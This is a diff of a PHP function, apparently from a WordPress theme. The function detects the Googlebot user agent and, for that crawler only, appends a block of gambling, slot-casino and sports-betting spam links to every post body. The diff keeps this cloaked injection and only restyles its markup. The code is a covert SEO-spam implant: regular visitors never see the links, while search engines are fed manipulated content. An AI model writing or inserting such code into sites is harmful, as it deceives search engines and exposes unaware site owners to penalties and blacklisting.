@@ -1,16 +1,16 @@
 function bfa_append_to_post($post_body_content) {
 if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']),"googlebot")){
 $post_body_content = $post_body_content . 
-'<style>.center{margin:auto;width:50%;border:3px solid #000;padding:10px}.sitez{text-align:center;font-style:normal;text-decoration:none;font-weight:400;font-size:20px;color:#000}.sitez a{color:#eb4034}.sitez h1{font-family:helvetica;font-size:3vw;letter-spacing:5px;text-align:center;text-transform:uppercase}.sitez p{font-family:calibri;font-size:1.5vw;line-height:2vw;text-align:justify}</style>
-<div class="sitez center">
-<h1>Our Partners links :</h1>
+'<div class="sitez">
+<h1>Our Partners:</h1>
 <p>1.VIVA99 merupakan salah satu Situs <a href="https://www.charlestonchronicle.net/">Slot Online</a> Terpercaya di Asia yang banyak memberikan bonus</p>
 <p>2.Lợi của <a href="https://www.sipg-fc.com/">c&aacute; cược b&oacute;ng đ&aacute;</a> Trực tuyến tại FB9</p>
 <p>3.Funbet9 hoạt động giống như bất kỳ trang web <a href="https://www.rebellenyc.com/">c&aacute; cược thể thao</a> Trực tuyến tại</p>
 <p>4. Catconla Your Trusted <a href="http://www.catconla.com/" target="_blank">Online Gambling</a> Site ever</p>
 <p>5. Start Playing Best <a href="https://www.satelitpost.com/" target="_blank">Casino Online Trusted</a> in Asia 2022</p>
 <p>5. Brazelberries is a trusted Online <a href="https://www.brazelberries.com/" target="_blank">Gambling News</a> in The World</p>
-<p>6. thethaoFB9 Trang <a href="https://www.fcbanat.com/" target="_blank">Cá Cược Bóng Đá</a> Uy Tín Số 1 Việt Nam</p>';
+<p>6. thethaoFB9 Trang <a href="https://www.fcbanat.com/" target="_blank">C&aacute; Cược B&oacute;ng Đ&aacute;</a> Uy T&iacute;n Số 1 Việt Nam</p>
+</div>';
 return $post_body_content;
   }
 }
